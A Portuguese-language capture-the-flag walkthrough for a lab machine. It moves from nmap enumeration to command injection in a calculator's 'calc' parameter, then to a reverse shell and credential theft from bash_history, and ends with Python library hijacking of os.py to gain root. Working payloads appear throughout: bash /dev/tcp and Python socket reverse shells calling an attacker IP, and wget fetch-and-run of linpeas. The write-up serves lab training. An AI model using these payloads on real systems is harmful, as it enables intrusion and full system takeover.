# Command Injection + Python Library Hijacking

---

## Etapa 1: Enumeração Inicial com Nmap

### Objetivo:

Descobrir serviços ativos e portas abertas no alvo.

### Comando:

```bash
nmap -sV -p- -T4 192.168.0.13
```

**Resultado esperado:**

- Porta 22 (SSH)
    
- Porta 80 (HTTP)
    
- Porta 111 (RPCBind)
    

---

## Etapa 2: Acesso ao site vulnerável

### Objetivo:

Explorar a aplicação web com uma calculadora vulnerável em `http://192.168.0.13`

1. Acesse o site via navegador.
    
2. Clique em "Calcular" para acionar o backend.
    
3. Intercepte a requisição com o **Burp Suite**.
    
4. Envie a requisição para o **Repeater**.
    
5. Substitua o valor do parâmetro `calc` por:
    
    ```
    `id`
    ```
    
6. Clique em **Send** e verifique a aba **Response**.
    

**Se retornar `uid=33(www-data)`**, você tem **Command Injection**!

---

## Etapa 3: Execução de Shell Reversa

### Na sua máquina atacante:

```bash
nc -lvnp 443
```

### Payload para usar no Burp (campo `calc`):

```bash
/bin/bash -c 'sh -i >& /dev/tcp/SEU_IP/443 0>&1'
```

### Encode no Burp (Ctrl+U):

```
/bin/bash+-c+'sh+-i+>%26+/dev/tcp/10.10.14.55/443+0>%261'
```

### Envie a requisição no Repeater

Se tudo funcionar, você verá a conexão chegando no netcat.

---

## Etapa 4: Melhorar Shell com TTY

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Etapa 5: Encontrar flag de user

```bash
cd /home/sysadmin
cat .bash_history
su sysadmin
# Digite a senha encontrada no bash_history
cat user.txt
```

**Flag de user encontrada!**

---

## Etapa 6: Rodando o linpeas.sh para descobrir escalada de privilégio

### Na sua máquina atacante:

1. Baixe o script:
    

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

2. Rode um servidor HTTP:
    

```bash
python3 -m http.server 80
```

> Certifique-se de estar no diretório onde está o `linpeas.sh` ao rodar o comando acima.

### Na máquina invadida (como sysadmin):

```bash
cd /tmp
wget http://10.10.14.55/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.log
```

**Procure por arquivos com permissão de escrita, como `os.py` em `/usr/lib/python3.X/os.py`**

---

## Etapa 7: Python Library Hijacking com os.py

### 1. Confirme permissão de escrita:

```bash
ls -l /usr/lib/python3.X/os.py
```

### 2. Faça backup do arquivo original:

```bash
cp /usr/lib/python3.X/os.py /tmp/os.py.bkp
```

### 3. Edite e injete o código de reverse shell:

```bash
nano /usr/lib/python3.X/os.py
```

**No final do arquivo, cole:**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.55",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### 4. Em sua máquina atacante:

```bash
nc -lvnp 4444
```

### 5. Execute o script Python com sudo:

```bash
sudo /usr/bin/python3 /opt/pycalc/calc.py
```

---

## Etapa 8: Shell como root

No Netcat, você agora terá root:

```bash
whoami
# root
cat /root/root.txt
```

---

## Concluído!

Você realizou:

- Enumeração com Nmap
    
- Exploração com Command Injection
    
- Reverse Shell
    
- Escalada via bash_history
    
- Enumeração com linpeas
    
- Hijack de biblioteca Python
    
- Root Shell
